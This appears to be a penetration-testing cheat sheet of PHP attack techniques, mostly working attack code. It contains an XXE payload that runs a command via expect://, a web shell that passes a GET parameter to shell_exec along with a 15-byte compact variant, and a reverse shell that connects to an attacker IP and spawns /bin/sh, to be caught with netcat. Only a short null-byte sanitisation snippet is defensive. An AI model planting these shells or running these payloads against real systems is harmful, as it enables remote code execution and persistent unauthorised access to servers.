## RCE via XXE

RCE through XEE is apparently rare, but can be achieved via the PHP expect module.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxerce SYSTEM "expect://id">]>
<root>&xxerce;</root>
```

## The Poison Null Byte

PHP string parsing is susceptible to the poison null byte.

The best way to defend against these attacks is to simply sanitize strings by explicitly removing any null bytes they contain.

```php
$sanitized_string = str_replace(chr(0), '', $original_string);  
```

## Web-Based RCE

```php
<?php
	echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
?>
```

A slightly spruced-up version of this is available on Kali Linux as `/usr/share/webshells/php/simple-backdoor.php`.

On space-constrained systems, you can compact this down to just 15 bytes:

```php
<?=`$_GET[1]`?>
```

## Reverse Shell

Check out `/usr/share/webshells/php/php-reverse-shell.php` on Kali Linux. Note that this only works on UNIX-like systems.

Alternately, a *very* simple shell (suitable for running at the command line):

```php
$attacker_ip = "10.0.0.1";
$attacker_port = 1234;

$sock = fsockopen($attacker_ip, $attacker_port);

exec("/bin/sh -i <&3 >&3 2>&3");
```

Catch it with netcat or socat.
